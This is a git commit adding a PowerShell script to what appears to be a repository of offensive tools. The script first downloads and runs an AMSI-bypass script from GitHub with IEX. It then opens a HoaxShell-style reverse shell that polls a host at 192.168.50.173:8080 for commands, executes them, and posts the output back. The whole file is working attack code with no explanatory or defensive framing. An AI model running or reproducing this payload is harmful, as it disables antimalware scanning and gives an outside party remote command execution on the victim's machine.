c6b8a44f400a9bcb4b404678f167c2f592bfa55f
paulkwalton <43542501+paulkwalton@users.noreply.github.com>
2025-01-02 15:46:13 +0000

    Create hoax-shell-with-amsi.ps1

---
+++ privesc/windows/hoax-shell-with-amsi.ps1
@@ -0,0 +1,3 @@
+IEX (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/paulkwalton/thescriptvault/refs/heads/main/privesc/windows/amsi-bypass.ps1")
+$s='192.168.50.173:8080';$i='14f30f27-650c00d7-fef40df7';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/14f30f27 -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/650c00d7 -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/fef40df7 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
+ 
